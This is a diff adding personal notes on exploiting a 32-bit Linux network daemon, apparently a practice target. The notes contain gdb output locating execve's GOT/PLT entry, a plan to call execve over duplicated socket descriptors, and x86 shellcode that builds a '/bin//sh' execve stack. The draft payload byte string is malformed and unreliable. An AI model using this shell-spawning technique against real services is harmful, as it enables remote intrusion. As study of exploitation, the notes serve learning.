@@ -49,3 +49,83 @@ Would it be possible to set esp to 0x804b480 and use that area like a stack?
 
 Permissions of memory region
   0x804b420->0x804b500 at 0x00002418: .bss ALLOC   <-- Can I execute in this space?
+
+
+gdb info files and searching for got.plt
+	0x0804b36c - 0x0804b410 is .got.plt
+
+
+1) File descriptors duplicated for STDIN/OUT so we can call execve directly
+2) execve( char* bin_sh, argv, NULL)
+3) Is execve in import table?
+   Symbol table '.dynsym' contains 46 entries:
+   Num:    Value  Size Type    Bind   Vis      Ndx Name
+     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND 
+     1: 00000000     0 FUNC    GLOBAL DEFAULT  UND setsockopt@GLIBC_2.0 (2)
+     2: 00000000     0 FUNC    GLOBAL DEFAULT  UND dup2@GLIBC_2.0 (2)
+     3: 00000000     0 FUNC    GLOBAL DEFAULT  UND setresuid@GLIBC_2.0 (2)
+     4: 00000000     0 FUNC    GLOBAL DEFAULT  UND read@GLIBC_2.0 (2)
+     5: 00000000     0 FUNC    GLOBAL DEFAULT  UND printf@GLIBC_2.0 (2)
+     6: 00000000     0 FUNC    GLOBAL DEFAULT  UND signal@GLIBC_2.0 (2)
+     7: 00000000     0 FUNC    GLOBAL DEFAULT  UND wait@GLIBC_2.0 (2)
+     8: 00000000     0 FUNC    GLOBAL DEFAULT  UND htons@GLIBC_2.0 (2)
+     9: 00000000     0 FUNC    GLOBAL DEFAULT  UND err@GLIBC_2.0 (2)
+    10: 00000000     0 FUNC    GLOBAL DEFAULT  UND setgroups@GLIBC_2.0 (2)
+    11: 00000000     0 FUNC    GLOBAL DEFAULT  UND accept@GLIBC_2.0 (2)
+    12: 00000000     0 FUNC    GLOBAL DEFAULT  UND fwrite@GLIBC_2.0 (2)
+    13: 00000000     0 FUNC    GLOBAL DEFAULT  UND getpid@GLIBC_2.0 (2)
+    14: 00000000     0 FUNC    GLOBAL DEFAULT  UND daemon@GLIBC_2.0 (2)
+    15: 00000000     0 FUNC    GLOBAL DEFAULT  UND setrlimit@GLIBC_2.2 (3)
+    16: 00000000     0 FUNC    GLOBAL DEFAULT  UND malloc@GLIBC_2.0 (2)
+    17: 00000000     0 FUNC    GLOBAL DEFAULT  UND puts@GLIBC_2.0 (2)
+    18: 00000000     0 FUNC    GLOBAL DEFAULT  UND strerror@GLIBC_2.0 (2)
+    19: 00000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
+    20: 00000000     0 FUNC    GLOBAL DEFAULT  UND exit@GLIBC_2.0 (2)
+    21: 00000000     0 FUNC    GLOBAL DEFAULT  UND open@GLIBC_2.0 (2)
+    22: 00000000     0 FUNC    GLOBAL DEFAULT  UND srand@GLIBC_2.0 (2)
+    23: 00000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.0 (2)
+    24: 00000000     0 FUNC    GLOBAL DEFAULT  UND fprintf@GLIBC_2.0 (2)
+    25: 00000000     0 FUNC    GLOBAL DEFAULT  UND execve@GLIBC_2.0 (2)             <------ execve
+
+    - walked the plt starting at 0x8048b3d
+    (gdb) info files
+            0x0804b36c - 0x0804b410 is .got.plt
+        
+    - 0xb36c + 25*4 = 0xb3D0, first two entries of got[0] and got[1] are reserved
+      0xb3d0 + 0x4 + 0x4 = 0xb3d8
+
+    (gdb) x/wx 0x804b3d8
+            0x804b3d8 <execve@got.plt>:	0x080489b6 (plt entry)
+    
+    - 0x80489b6 means function hasn't been resolved yet otherwise we'd see something likx 0xb......
+
+    (gdb) disas 0x80489b6
+          Dump of assembler code for function execve@plt:
+            0x080489b0 <+0>:	jmp    DWORD PTR ds:0x804b3d8
+            0x080489b6 <+6>:	push   0xc0
+            0x080489bb <+11>:	jmp    0x8048820
+    
+    - at this point we can jump straight to this addres 0x80489b6 when we set the stack properly
+
+4) Setting up the stack
+  
+   xor eax, eax
+   push eax
+   push 0x68732f2f
+   push 0x6e69622f
+   mov ebx, esp     ; get ptr to /bin//sh
+   push eax
+   push ebx
+
+   Stack looks like this:
+
+   |_ptr_to_/bin/sh 
+   |_NULL______      <---- this can be included in our shell code
+   | "/bin/sh"
+   |___________
+   |_NULL______
+
+
+   "\x00\x00\x00\x00\x2f\x62\x69x6e\x68\x73\x2f\x2f\x6e\x00\x00\x00\x00 + !!!PTR!!!
+
+   
